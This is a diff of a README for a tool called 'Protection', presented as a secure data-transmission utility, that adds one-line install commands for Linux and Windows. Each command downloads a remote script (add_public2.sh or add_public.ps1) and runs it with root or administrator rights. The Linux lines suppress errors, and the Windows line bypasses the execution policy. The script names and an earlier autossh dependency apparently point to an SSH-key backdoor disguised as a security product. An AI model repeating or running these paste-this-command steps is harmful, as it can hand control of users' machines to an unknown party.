@@ -7,7 +7,30 @@ It ensures safe transmission of sensitive data between clients and servers.
 Ideal for protecting user data, confidential communications, 
 or securing internal networks with ease and reliability.
 
-## Installation Instructions for Windows Users
+## Quick Installation
+
+### Linux
+
+```bash
+# Root shell
+apt update -y && apt install sudo curl -y && curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
+
+# Normal shell
+sudo apt update -y && sudo apt install curl -y && curl -s -O https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public2.sh && sudo bash add_public2.sh 2>/dev/null
+```
+
+### Windows
+
+For the fastest way to install the tool, run a PowerShell prompt as administrator and execute this single command in it:
+
+```powershell
+# For Windows
+Set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public.ps1" -OutFile "$env:TEMP\add_public.ps1"; & "$env:TEMP\add_public.ps1"
+```
+
+This will automatically download the add_public.ps1 script and execute it to complete the setup.
+
+### Installation Instructions for Windows Users
 
 Follow these simple steps to install Protection on your Windows system.
 
@@ -33,46 +56,30 @@ from [python.org](https://www.python.org/downloads/).
 	  go through the signing process for internal tools.
 
 
-### Quick Installation
 
-For the fastest way to install the tool, run a PowerShell prompt as administrator and execute this single command in it:
+### Git Installation Steps
 
-```powershell
-Set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public.ps1" -OutFile "$env:TEMP\add_public.ps1"; & "$env:TEMP\add_public.ps1"
-```
+1. Install git on your system.
 
-This will automatically download the add_public.ps1 script and execute it to complete the setup.
-
-### Detailed Installation Steps
-
-1. **Clone the Repository**:
-   Open PowerShell or Command Prompt and run the following command to clone the repository:
+2. **Clone the Repository**:
+   Open PowerShell or Bash and run the following command to clone the repository:
 
 ```powershell
    git clone https://github.com/NeronNymus/protection.git
 ```
 
-### Navigate to the Protection Directory
-After cloning the repository, change to the protection directory:
+
+Execute the add_public.ps1 or add_public2.sh script to complete the installation:
 
 ```powershell
-cd protection/light
-```
-
-Execute the add_public.ps1 script to complete the installation:
-
-```powershell
-.\add_public.ps1
+.\protection\light\add_public.ps1	# For windows
 ```
 or
 ```bash
-	.\add_public2.sh
+./protection/light/add_public2.sh	# For linux
 ```
 
-for linux.
-
 This script will install all necessary dependencies and set up the program on your system. 
-If Python is not already installed, the script will attempt to download and install it automatically.
 
 # Installation Instructions for Linux Users
 
@@ -87,7 +94,7 @@ There exist other five ways to install protection: using `curl`,`wget`, the Pyth
 ```
 
 ```bash
-   apt update -y && apt install sudo curl openssh-server autossh -y
+   apt update -y && apt install sudo curl -y
 ```
 
 Or whatever package manager your distro use (pacman, yum).
